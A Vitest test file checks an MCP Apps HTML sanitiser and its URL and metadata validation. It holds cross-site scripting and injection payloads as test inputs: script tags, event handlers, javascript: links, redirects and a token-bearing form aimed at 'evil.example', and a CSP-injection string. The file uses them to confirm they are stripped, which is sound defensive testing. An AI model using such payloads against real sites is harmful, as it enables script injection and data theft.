import { describe, expect, it } from "vitest";
import {
  createMcpAppResource,
  sanitizeMcpDisplayHtml,
  escapeMcpAppText,
} from "../src/mcp/display.js";
import { createNativeMcp, type NativeMcpContext } from "../src/mcp/server.js";
import { MCP_APP_MIME_TYPE, mcpAppOriginSchema } from "../src/mcp/apps.js";
import { nativeMcpReadResultSchema, nativeMcpToolDefinitionSchema } from "../src/mcp/native.js";
import {
  mcpReadResultSchema,
  mcpToolsResponseSchema,
  mcpResourcesResponseSchema,
} from "../src/mcp/contracts.js";

const context: NativeMcpContext = {
  auth: {
    identityType: "machine",
    identity: { type: "machine", subject: "machine:test", clientId: "test" },
    subject: "machine:test",
    clientId: "test",
    scopes: ["read"],
    tokenId: "test",
  },
  signal: new AbortController().signal,
};
const origin = "https://expenses.example";

describe("display-only MCP Apps", () => {
  it("generates the URI, HTML and least-privilege CSS origins without a separate HTML endpoint", async () => {
    const app = createMcpAppResource({
      name: "expenses",
      scopes: ["read"],
      resourceOrigin: origin,
      displayModes: ["inline", "fullscreen", "pip"],
      styleUrls: [`${origin}/assets/ui.css?v=1&theme=dark`, `${origin}/assets/fonts.css`],
      render: ({ auth }) => `<main><h1>${escapeMcpAppText(auth.subject)}</h1></main>`,
    });
    expect(app).toMatchObject({
      uri: "ui://weldall/expenses",
      mimeType: MCP_APP_MIME_TYPE,
      scopes: ["read"],
    });
    const result = nativeMcpReadResultSchema.parse(await app.handler(context));
    expect(result.contents[0]).toMatchObject({
      uri: app.uri,
      _meta: { ui: { csp: { resourceDomains: [origin] }, prefersBorder: true } },
    });
    const html = result.contents[0]!.text!;
    expect(html).toContain("<h1>machine:test</h1>");
    expect(html).toContain('href="https://expenses.example/assets/ui.css?v=1&amp;theme=dark"');
    expect(html).toContain("script-src &#39;sha256-");
    expect(html).toContain('"displayModes":["inline","fullscreen","pip"]');
    expect(html).toContain("connect-src &#39;none&#39;");
    expect(sanitizeMcpDisplayHtml(html, origin)).toBe(html);
    expect(escapeMcpAppText("<script>\"&'</script>")).toBe(
      "&lt;script&gt;&quot;&amp;&#39;&lt;/script&gt;",
    );
  });

  it("removes active markup, navigation, undeclared assets and event handlers at the rendering boundary", () => {
    const html = sanitizeMcpDisplayHtml(
      `<!doctype html><html><head>
      <meta http-equiv="refresh" content="0;url=https://evil.example">
      <base href="https://evil.example"><style>body { background: red }</style>
      <link rel="stylesheet" href="${origin}/safe.css" onload="evil()">
      <link rel="stylesheet" href="https://evil.example/evil.css">
      <link rel="preload" as="script" href="${origin}/evil.js">
      </head><body onload="evil()"><main class="card"><h1>Safe</h1>
      <script>parent.postMessage({method: 'tools/call', id: 'untrusted-request'}, '*')</script>
      <iframe srcdoc="&lt;script&gt;evil()&lt;/script&gt;"></iframe>
      <object data="https://evil.example"></object><embed src="https://evil.example">
      <svg><a href="javascript:evil()"><text>SVG</text></a></svg>
      <math><annotation-xml encoding="text/html"><script>evil()</script></annotation-xml></math>
      <form action="https://evil.example"><input name="token"><button formaction="https://evil.example">Submit</button></form>
      <a href="https://evil.example" target="_top" ping="https://evil.example">Link</a>
      <img src="x" onerror="evil()"><div style="background:url(https://evil.example)">Text</div>
      </main></body></html>`,
      origin,
    );
    expect(html).toContain('<main class="card"><h1>Safe</h1>');
    expect(html).toContain(`<link rel="stylesheet" href="${origin}/safe.css" />`);
    expect(html).not.toMatch(/<(iframe|svg|math|object|embed|base|form|input|button|style)\b/i);
    expect(html).not.toMatch(/\b(onload|onerror|srcdoc|ping|target|style)=/i);
    expect(html).not.toContain("evil.example");
    expect(html).not.toContain("untrusted-request");
    expect(html).not.toContain('http-equiv="refresh"');
    expect(html).not.toContain("javascript:");
  });

  it("queues only same-origin modules and replaces all provider inline code with the fixed bootstrap", () => {
    const html = sanitizeMcpDisplayHtml(
      `<div id="root"></div>
      <script type="module" src="${origin}/react.js"></script>
      <script type="module" src="https://evil.example/attack.js"></script>
      <script src="${origin}/classic.js"></script>
      <script>alert("UNTRUSTED")</script>`,
      origin,
    );
    expect(html).toContain('id="root"');
    expect(html).toContain(`"scriptUrls":["${origin}/react.js"]`);
    expect(html).not.toContain("evil.example");
    expect(html).not.toContain("classic.js");
    expect(html).not.toContain("UNTRUSTED");
    expect(html).not.toMatch(/<script[^>]+src=/);
    expect(html).toContain("weldall/display-only");
    expect(sanitizeMcpDisplayHtml(html, origin)).toBe(html);
    expect(() =>
      createMcpAppResource({
        name: "x",
        scopes: ["read"],
        resourceOrigin: origin,
        scriptUrls: ["https://evil.example/a.js"],
        render: () => "",
      }),
    ).toThrow();
  });

  it.each([
    "/relative.css",
    "//example.com/style.css",
    "javascript:alert(1)",
    "data:text/css,a{}",
    "https://user:secret@example.com/ui.css",
    "https://*.example.com/ui.css",
    "http://example.com/ui.css",
    "https://evil';.example/ui.css",
  ])("rejects unsafe asset URL %s", (url) => {
    expect(() =>
      createMcpAppResource({
        name: "app",
        scopes: ["read"],
        resourceOrigin: origin,
        styleUrls: [url],
        render: () => "",
      }),
    ).toThrow();
  });

  it("allows explicit loopback assets but not CSP paths, wildcards or injections", () => {
    expect(() =>
      createMcpAppResource({
        name: "app",
        scopes: ["read"],
        resourceOrigin: "http://localhost:3000",
        styleUrls: ["http://localhost:3000/style.css"],
        render: () => "",
      }),
    ).not.toThrow();
    for (const value of [
      "https://example.com/path",
      "https://example.com/",
      "*",
      "https://example.com; script-src *",
      "'self'",
    ])
      expect(mcpAppOriginSchema.safeParse(value).success).toBe(false);
  });

  it("preserves only supported native UI metadata; connector contracts remain UI-blind", () => {
    const tool = {
      name: "show",
      inputSchema: { type: "object" },
      _meta: { ui: { resourceUri: "ui://app/view", visibility: ["app"] }, goose: { mcpApp: {} } },
    };
    expect(nativeMcpToolDefinitionSchema.parse(tool)._meta).toEqual({
      ui: { resourceUri: "ui://app/view" },
    });
    expect(mcpToolsResponseSchema.parse({ tools: [tool] }).tools[0]).not.toHaveProperty("_meta");
    const value = {
      contents: [
        {
          uri: "ui://app/view",
          text: "<h1>Hi</h1>",
          _meta: {
            ui: {
              csp: { resourceDomains: [origin], connectDomains: [origin], frameDomains: [origin] },
              permissions: { camera: {} },
            },
            goose: {},
          },
        },
      ],
    };
    expect(nativeMcpReadResultSchema.parse(value).contents[0]!._meta).toEqual({
      ui: { csp: { resourceDomains: [origin] } },
    });
    expect(mcpReadResultSchema.parse(value).contents[0]).not.toHaveProperty("_meta");
  });

  it("validates per-view allowlists against the local catalog and includes policy in the revision", () => {
    const tool = {
      name: "approve",
      scopes: ["write"],
      inputSchema: { type: "object" as const },
      handler: async () => ({ content: [] }),
    };
    const view = (allowedTools: string[]) =>
      createMcpAppResource({
        name: "view",
        scopes: ["read"],
        allowedTools,
        render: () => "<h1>Demo</h1>",
      });
    const provider = (allowedTools: string[]) =>
      createNativeMcp({
        path: "/mcp",
        description: "Demo",
        discoveryScopes: ["read"],
        tools: [tool],
        resources: [view(allowedTools)],
      });
    expect(provider(["approve"]).metadata(origin).revision).not.toBe(
      provider([]).metadata(origin).revision,
    );
    expect(view(["approve"])._meta).toEqual({ ui: { allowedTools: ["approve"] } });
    expect(
      mcpResourcesResponseSchema.parse({ resources: [view(["approve"])] }).resources[0],
    ).not.toHaveProperty("_meta");
    expect(() => provider(["foreign_tool"])).toThrow("allowedTools");
    expect(() => view(["approve", "approve"])).toThrow();
    expect(() =>
      createNativeMcp({
        path: "/mcp",
        description: "Demo",
        discoveryScopes: ["read"],
        tools: [tool],
        resources: [{ ...view(["approve"]), mimeType: "text/plain" }],
      }),
    ).toThrow("allowedTools");
  });

  it("requires a registered HTML resource for each tool UI and includes its reference in the revision", () => {
    const view = createMcpAppResource({
      name: "view",
      scopes: ["read"],
      render: () => "<h1>Hello</h1>",
    });
    const tool = {
      name: "show",
      inputSchema: { type: "object" as const },
      scopes: ["read"],
      _meta: { ui: { resourceUri: view.uri } },
      handler: async () => ({ content: [{ type: "text" as const, text: "Hello" }] }),
    };
    const options = { path: "/mcp", description: "Demo", discoveryScopes: ["read"], tools: [tool] };
    expect(() => createNativeMcp(options)).toThrow("registered HTML UI resource");
    expect(() =>
      createNativeMcp({ ...options, resources: [{ ...view, mimeType: "application/json" }] }),
    ).toThrow("registered HTML UI resource");
    const withUi = createNativeMcp({ ...options, resources: [view] });
    const { _meta: _, ...plainTool } = tool;
    const withoutUi = createNativeMcp({ ...options, tools: [plainTool], resources: [view] });
    expect(withUi.metadata(origin).revision).not.toBe(withoutUi.metadata(origin).revision);
  });
});
